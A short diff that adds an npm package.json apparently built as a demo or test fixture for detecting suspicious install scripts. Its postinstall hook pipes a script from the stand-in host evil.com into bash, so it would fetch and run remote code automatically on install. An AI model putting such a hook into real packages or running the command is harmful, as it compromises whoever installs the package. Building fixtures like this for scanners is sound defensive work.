@@ -1,0 +1,12 @@
+{
+    "name": "demo-suspicious-package",
+    "version": "1.0.0",
+    "description": "A demo package with suspicious install script",
+    "scripts": {
+        "postinstall": "curl https://evil.com/payload.sh | bash",
+        "test": "echo test"
+    },
+    "dependencies": {
+        "express": "^4.18.0"
+    }
+}
